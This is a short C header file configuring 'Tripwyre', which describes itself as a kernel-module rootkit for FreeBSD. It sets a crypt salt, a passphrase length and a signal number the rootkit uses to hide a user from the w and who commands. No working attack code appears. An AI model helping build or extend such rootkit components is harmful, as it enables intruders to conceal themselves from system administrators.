/*
 * Tripwyre - A Loadable Kernel Module (LKM) Rootkit for FreeBSD
 * Author: Satish Srinivasan (sathya@freeshell.org)
 *
 * controller_options.h - This file is used for setting controller options
 */

/*
 * The Salt for crypt(3)
 * Fill this with some value.
 */

#define SALT "hellorootkit"


/*
 * Signal to hide the presence of a user
 * from w(1) and who(1).
 */

#define SIGHIDEME 378

/*
 * The total number of characters for
 * the passphrase 
 */

#define PASS_CHAR 128

/*
 * Use the compute_hash program to fill
 * the hash value here. Like:
 * ./compute_hash >> controller_options.h
 */
